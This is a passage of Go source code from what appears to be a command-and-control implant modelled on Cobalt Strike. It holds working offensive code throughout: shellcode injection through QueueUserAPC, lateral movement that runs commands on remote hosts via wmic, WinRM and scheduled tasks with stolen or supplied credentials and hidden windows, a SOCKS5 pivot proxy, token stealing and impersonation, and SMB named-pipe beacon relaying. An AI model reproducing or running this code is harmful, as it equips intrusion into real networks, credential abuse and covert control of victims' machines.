	procWriteProcessMemory.Call(hProc, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(unsafe.Pointer(&w)))

	// Find a thread in the process to queue APC to
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return fmt.Errorf("thread snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))
	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			hThread, _, _ := procOpenThread.Call(THREAD_SUSPEND_RESUME|0x0010 /*THREAD_SET_CONTEXT?*/, 0, uintptr(te.th32ThreadID))
			if hThread != 0 {
				// Queue APC
				procQueueUserAPC.Call(addr, hThread, 0)
				procCloseHandle.Call(hThread)
				return nil // queued to first thread found
			}
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return fmt.Errorf("no suitable thread for APC")
}

// Simplified early bird: alloc in target (assume already have h, for demo we do basic suspended not fully here)
// For full would CreateProcess suspended + apc to main thread. Here we approximate via existing pid.
func doEarlyBird(hProc uintptr, pid uint32, sc []byte) error {
	// Same as APC for now (real earlybird needs createproc control)
	return doQueueUserAPC(hProc, pid, sc)
}

// --- Lateral movement (6) ---

func lateralMove(spec string) (string, error) {
	// Format: type|target|user|pass|cmd   e.g. "winrm|192.168.1.50|admin|pass123|whoami"
	// Or "wmi|..." "psexec|..."
	parts := strings.SplitN(spec, "|", 5)
	if len(parts) < 3 {
		return "", fmt.Errorf("format: type|target|user|pass|cmd (user/pass optional for some)")
	}
	typ := strings.ToLower(strings.TrimSpace(parts[0]))
	target := strings.TrimSpace(parts[1])
	user := ""
	pass := ""
	cmd := ""
	if len(parts) > 2 {
		user = strings.TrimSpace(parts[2])
	}
	if len(parts) > 3 {
		pass = strings.TrimSpace(parts[3])
	}
	if len(parts) > 4 {
		cmd = strings.TrimSpace(parts[4])
	}
	if cmd == "" {
		cmd = "whoami"
	}

	switch typ {
	case "wmi", "wmiexec":
		return doWMI(target, user, pass, cmd)
	case "winrm", "psremoting":
		return doWinRM(target, user, pass, cmd)
	case "psexec", "smbexec", "psexec-like":
		return doPsexecLike(target, user, pass, cmd)
	default:
		return doWMI(target, user, pass, cmd) // fallback
	}
}

func doWMI(target, user, pass, cmd string) (string, error) {
	// Use wmic or powershell for WMI exec (best effort, often needs creds)
	if user != "" && pass != "" {
		// wmic /node:target /user:domain\user /password:pass process call create "cmd"
		script := fmt.Sprintf(`wmic /node:%s /user:%s /password:%s process call create "cmd.exe /c %s"`, target, user, pass, cmd)
		c := exec.Command("cmd", "/c", script)
		applyHideWindow(c)
		out, _ := c.CombinedOutput()
		return string(out), nil
	}
	// no creds supplied: assume current context / kerberos
	script := fmt.Sprintf(`wmic /node:%s process call create "cmd.exe /c %s"`, target, cmd)
	c := exec.Command("cmd", "/c", script)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	return string(out), err
}

func doWinRM(target, user, pass, cmd string) (string, error) {
	// PowerShell remoting. If creds given use PSCredential
	ps := ""
	if user != "" && pass != "" {
		ps = fmt.Sprintf(`$s=New-Object System.Management.Automation.PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force)); Invoke-Command -ComputerName %s -Credential $s -ScriptBlock { cmd /c "%s" }`, user, pass, target, cmd)
	} else {
		ps = fmt.Sprintf(`Invoke-Command -ComputerName %s -ScriptBlock { cmd /c "%s" }`, target, cmd)
	}
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	return string(out), err
}

func doPsexecLike(target, user, pass, cmd string) (string, error) {
	// Implement simple: admin share copy + remote schtasks or service (no real psexec binary needed)
	_ = fmt.Sprintf(`\\%s\C$\Windows\Temp\forge_drop.exe`, target) // placeholder for future dropper binary
	_ = filepath.Join(os.Getenv("TEMP"), "forge_drop.exe")
	// copy self or a payload? For demo, we execute a command via schtasks after copy if binary, but here we use remote cmd via wmi fallback mostly.
	// Simpler: just use schtasks /s target /u /p to create a task that runs cmd
	// To make "psexec" like, we copy a small stager but instead just schedule the cmd.
	// For value: copy current agent? but for lateral exec given cmd.

	// 1. net use or direct copy using current token or creds
	if user != "" {
		// try map with creds (net use)
		nc := exec.Command("cmd", "/c", fmt.Sprintf(`net use \\%s\C$ /user:%s %s`, target, user, pass))
		applyHideWindow(nc)
		nc.CombinedOutput()
	}

	// 2. write a small .bat or use wmic/schtasks remote
	schName := "ForgeLateral" + strconv.Itoa(int(time.Now().Unix()%10000))
	schCmd := fmt.Sprintf(`schtasks /s %s /u %s /p %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`, target, user, pass, schName, cmd)
	if user == "" {
		schCmd = fmt.Sprintf(`schtasks /s %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`, target, schName, cmd)
	}
	c := exec.Command("cmd", "/c", schCmd)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	res := string(out)
	if err == nil {
		// try run
		runSch := exec.Command("cmd", "/c", fmt.Sprintf(`schtasks /s %s /run /tn %s`, target, schName))
		if user != "" {
			// pass creds again if needed
		}
		applyHideWindow(runSch)
		ro, _ := runSch.CombinedOutput()
		res += "\nRun: " + string(ro)
		// cleanup later optional
	}
	return "psexec-like via schtasks: " + res, err
}

// --- SOCKS5 (1) - working local proxy for pivoting ---

// Minimal SOCKS5 server. Listens and relays.
// Operator can use on the compromised host's network if reachable, or combine with port forwards.
// For full C2-relayed socks (CS style), the server would open local port and ferry bytes via special beacon tasks.
// This impl gives immediate value.

func startSocksServer(addr string) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		debugLog("SOCKS listen failed: " + err.Error())
		return
	}
	debugLog("SOCKS5 listening on " + addr)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleSocksConn(conn)
	}
}

func handleSocksConn(conn net.Conn) {
	defer conn.Close()

	// Read auth methods
	buf := make([]byte, 2)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return
	}
	if buf[0] != 0x05 { // ver
		return
	}
	nmethods := int(buf[1])
	methods := make([]byte, nmethods)
	io.ReadFull(conn, methods)
	// Reply no auth
	conn.Write([]byte{0x05, 0x00})

	// Read request
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return
	}
	if header[0] != 0x05 || header[1] != 0x01 { // CONNECT only
		conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // fail
		return
	}

	var dstAddr string
	switch header[3] {
	case 0x01: // IPv4
		ip := make([]byte, 4)
		io.ReadFull(conn, ip)
		portb := make([]byte, 2)
		io.ReadFull(conn, portb)
		dstAddr = fmt.Sprintf("%d.%d.%d.%d:%d", ip[0], ip[1], ip[2], ip[3], int(portb[0])<<8|int(portb[1]))
	case 0x03: // domain
		l := make([]byte, 1)
		io.ReadFull(conn, l)
		dom := make([]byte, int(l[0]))
		io.ReadFull(conn, dom)
		portb := make([]byte, 2)
		io.ReadFull(conn, portb)
		dstAddr = fmt.Sprintf("%s:%d", string(dom), int(portb[0])<<8|int(portb[1]))
	default:
		conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	// Dial target
	target, err := net.Dial("tcp", dstAddr)
	if err != nil {
		conn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	defer target.Close()

	// success reply (use 0.0.0.0:0)
	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	// Relay bidirectional
	go io.Copy(target, conn)
	io.Copy(conn, target)
}

// ============================================================
// TOKEN IMPERSONATION SUBSYSTEM
// ============================================================
// Provides Cobalt Strike "steal_token" / "make_token" parity:
//   token_list_procs  - enumerate processes with their token user info
//   token_steal  <pid>          - duplicate & impersonate token from pid
//   token_make   <domain\user> <password> [logon_type] - LogonUser + ImpersonateLoggedOnUser
//   token_revert / rev2self     - RevertToSelf
//   token_whoami                - return current impersonated identity
//
// All operate on the current thread's impersonation context.
// ============================================================

var (
	// advapi32 procs for token operations
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	procOpenProcessToken          = advapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx          = advapi32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser   = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf              = advapi32.NewProc("RevertToSelf")
	procGetTokenInformation       = advapi32.NewProc("GetTokenInformation")
	procLookupAccountSidW         = advapi32.NewProc("LookupAccountSidW")
	procLogonUserW                = advapi32.NewProc("LogonUserW")
	procImpersonateLoggedOnUserFn = advapi32.NewProc("ImpersonateLoggedOnUser")
)

const (
	TOKEN_DUPLICATE         = 0x0002
	TOKEN_IMPERSONATE       = 0x0004
	TOKEN_QUERY             = 0x0008
	TOKEN_ALL_ACCESS_TOKEN  = 0xF01FF
	TokenUser               = 1
	TokenIntegrityLevel     = 25
	TokenType_Token         = 8
	SecurityImpersonation   = 2
	TokenImpersonation      = 2
	TokenPrimary            = 1
	LOGON32_LOGON_INTERACTIVE = 2
	LOGON32_LOGON_NETWORK   = 3
	LOGON32_PROVIDER_DEFAULT = 0
)

// tokenInfoResult carries token metadata extracted from a process
type tokenInfoResult struct {
	PID         uint32
	ProcessName string
	Domain      string
	Username    string
	Integrity   string
	TokenType   string
	Error       string
}

// getCurrentTokenUser returns the current impersonated identity (after steal or make_token)
func getCurrentTokenUser() string {
	// open thread token first, fall back to process token
	var hToken uintptr
	currentThread, _, _ := k32.NewProc("GetCurrentThread").Call()
	advapi32.NewProc("OpenThreadToken").Call(currentThread, TOKEN_QUERY, 1, uintptr(unsafe.Pointer(&hToken)))
	if hToken == 0 {
		currentProcess, _, _ := k32.NewProc("GetCurrentProcess").Call()
		procOpenProcessToken.Call(currentProcess, TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	}
	if hToken == 0 {
		return "(unknown)"
	}
	defer procCloseHandle.Call(hToken)
	return getTokenUsername(hToken)
}

// getTokenUsername resolves the SID in the given token to DOMAIN\User
func getTokenUsername(hToken uintptr) string {
	// query required size
	var needed uint32
	procGetTokenInformation.Call(hToken, TokenUser, 0, 0, uintptr(unsafe.Pointer(&needed)))
	if needed == 0 {
		return "(unknown)"
	}
	buf := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(hToken, TokenUser, uintptr(unsafe.Pointer(&buf[0])), uintptr(needed), uintptr(unsafe.Pointer(&needed)))
	if ret == 0 {
		return "(query failed)"
	}
	// buf[0..] is TOKEN_USER = { SID_AND_ATTRIBUTES { Sid *SID, Attributes DWORD } }
	// the first pointer-width bytes hold the SID pointer
	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
	if sidPtr == 0 {
		return "(null sid)"
	}

	var nameLen, domLen uint32 = 256, 256
	name := make([]uint16, nameLen)
	dom := make([]uint16, domLen)
	var sidUse uint32
	ret, _, _ = procLookupAccountSidW.Call(
		0,
		sidPtr,
		uintptr(unsafe.Pointer(&name[0])),
		uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&dom[0])),
		uintptr(unsafe.Pointer(&domLen)),
		uintptr(unsafe.Pointer(&sidUse)),
	)
	if ret == 0 {
		return "(lookup failed)"
	}
	return syscall.UTF16ToString(dom[:domLen]) + "\\" + syscall.UTF16ToString(name[:nameLen])
}

// getTokenIntegrity returns integrity level string from a token
func getTokenIntegrity(hToken uintptr) string {
	var needed uint32
	procGetTokenInformation.Call(hToken, TokenIntegrityLevel, 0, 0, uintptr(unsafe.Pointer(&needed)))
	if needed == 0 {
		return "unknown"
	}
	buf := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(hToken, TokenIntegrityLevel, uintptr(unsafe.Pointer(&buf[0])), uintptr(needed), uintptr(unsafe.Pointer(&needed)))
	if ret == 0 {
		return "unknown"
	}
	// TOKEN_MANDATORY_LABEL: first word is SID pointer
	// The last sub-authority of the integrity SID encodes the level
	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
	if sidPtr == 0 {
		return "unknown"
	}
	// get sub-authority count
	subCount := *(*byte)(unsafe.Pointer(sidPtr + 1))
	if subCount == 0 {
		return "unknown"
	}
	// sub-authorities start at offset 8 (revision 1 + subcount 1 + identauth 6)
	ridOffset := uintptr(8) + uintptr(subCount-1)*4
	rid := *(*uint32)(unsafe.Pointer(sidPtr + ridOffset))
	switch {
	case rid < 0x2000:
		return "Untrusted"
	case rid < 0x3000:
		return "Low"
	case rid < 0x4000:
		return "Medium"
	case rid < 0x5000:
		return "Medium+"
	case rid < 0x6000:
		return "High"
	default:
		return "System"
	}
}

// tokenListProcesses enumerates processes and extracts token user / integrity for each.
// Returns JSON-serializable result list.
func tokenListProcesses() ([]tokenInfoResult, error) {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var entry processEntry32
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil, fmt.Errorf("Process32First failed")
	}

	var results []tokenInfoResult
	for ret != 0 {
		pid := entry.th32ProcessID
		procName := syscall.UTF16ToString(entry.szExeFile[:])

		res := tokenInfoResult{
			PID:         pid,
			ProcessName: procName,
		}

		// try to open process and its token
		hProc, _, _ := procOpenProcess.Call(
			uintptr(PROCESS_QUERY_INFORMATION),
			0,
			uintptr(pid),
		)
		if hProc != 0 {
			var hToken uintptr
			tokRet, _, _ := procOpenProcessToken.Call(hProc, TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
			if tokRet != 0 && hToken != 0 {
				res.Username = getTokenUsername(hToken)
				res.Integrity = getTokenIntegrity(hToken)
				procCloseHandle.Call(hToken)
			} else {
				res.Error = "token_access_denied"
			}
			procCloseHandle.Call(hProc)
		} else {
			res.Error = "process_access_denied"
		}

		results = append(results, res)
		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
	}
	return results, nil
}

// tokenSteal duplicates the primary token from a given PID and impersonates it.
// Returns impersonated username or error.
func tokenSteal(pid uint32) (domain, username, integrity string, err error) {
	hProc, _, _ := procOpenProcess.Call(
		uintptr(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ),
		0,
		uintptr(pid),
	)
	if hProc == 0 {
		// try ALL_ACCESS
		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	}
	if hProc == 0 {
		return "", "", "", fmt.Errorf("OpenProcess pid=%d failed (check privileges)", pid)
	}
	defer procCloseHandle.Call(hProc)

	var hToken uintptr
	ret, _, le := procOpenProcessToken.Call(hProc, TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_IMPERSONATE, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return "", "", "", fmt.Errorf("OpenProcessToken failed: %v", le)
	}
	defer procCloseHandle.Call(hToken)

	integrity = getTokenIntegrity(hToken)

	// Duplicate as impersonation token
	var hDup uintptr
	ret, _, le = procDuplicateTokenEx.Call(
		hToken,
		uintptr(TOKEN_ALL_ACCESS_TOKEN),
		0,
		uintptr(SecurityImpersonation),
		uintptr(TokenImpersonation),
		uintptr(unsafe.Pointer(&hDup)),
	)
	if ret == 0 {
		return "", "", "", fmt.Errorf("DuplicateTokenEx failed: %v", le)
	}

	user := getTokenUsername(hDup)
	parts := strings.SplitN(user, "\\", 2)
	if len(parts) == 2 {
		domain = parts[0]
		username = parts[1]
	} else {
		username = user
	}

	// Impersonate
	ret, _, le = procImpersonateLoggedOnUser.Call(hDup)
	procCloseHandle.Call(hDup)
	if ret == 0 {
		return domain, username, integrity, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", le)
	}

	debugLog(fmt.Sprintf("Token stolen from pid %d: %s\\%s (%s)", pid, domain, username, integrity))
	return domain, username, integrity, nil
}

// tokenMake creates a new token by calling LogonUser with provided credentials.
// logonType: "interactive" (2), "network" (3), "network_cleartext" (8), etc.
func tokenMake(domainUser, password, logonTypeStr string) (domain, username, integrity string, err error) {
	// parse DOMAIN\user or user@domain
	var dom, user string
	if strings.Contains(domainUser, "\\") {
		parts := strings.SplitN(domainUser, "\\", 2)
		dom = parts[0]
		user = parts[1]
	} else if strings.Contains(domainUser, "@") {
		parts := strings.SplitN(domainUser, "@", 2)
		user = parts[0]
		dom = parts[1]
	} else {
		user = domainUser
		dom = "."
	}

	logonType := uint32(LOGON32_LOGON_INTERACTIVE)
	switch strings.ToLower(strings.TrimSpace(logonTypeStr)) {
	case "network", "3":
		logonType = LOGON32_LOGON_NETWORK
	case "interactive", "2", "":
		logonType = LOGON32_LOGON_INTERACTIVE
	}

	userPtr, _ := syscall.UTF16PtrFromString(user)
	domPtr, _ := syscall.UTF16PtrFromString(dom)
	passPtr, _ := syscall.UTF16PtrFromString(password)

	var hToken uintptr
	ret, _, le := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		uintptr(logonType),
		LOGON32_PROVIDER_DEFAULT,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return "", "", "", fmt.Errorf("LogonUser failed for %s\\%s: %v", dom, user, le)
	}

	integrity = getTokenIntegrity(hToken)

	ret, _, le = procImpersonateLoggedOnUser.Call(hToken)
	procCloseHandle.Call(hToken)
	if ret == 0 {
		return dom, user, integrity, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", le)
	}

	debugLog(fmt.Sprintf("Token made for %s\\%s (%s)", dom, user, integrity))
	return dom, user, integrity, nil
}

// tokenRevert drops impersonation and returns to process identity (RevertToSelf)
func tokenRevert() error {
	ret, _, le := procRevertToSelf.Call()
	if ret == 0 {
		return fmt.Errorf("RevertToSelf failed: %v", le)
	}
	debugLog("RevertToSelf: back to process token")
	return nil
}

func sendP2PSMBBeacon(body []byte) []byte {
	pipeName := strings.TrimPrefix(P2PParent, "pipe://")
	pipePath := fmt.Sprintf(`\\.\pipe\%s`, pipeName)
	conn, err := winio.DialPipe(pipePath, nil)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB pipe dial to %s failed: %v\n", pipePath, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

func p2pListenSMB() {
	ln, err := winio.ListenPipe(fmt.Sprintf(`\\.\pipe\%s`, P2PListenAddr), nil)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB listen on %s failed: %v\n", P2PListenAddr, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}

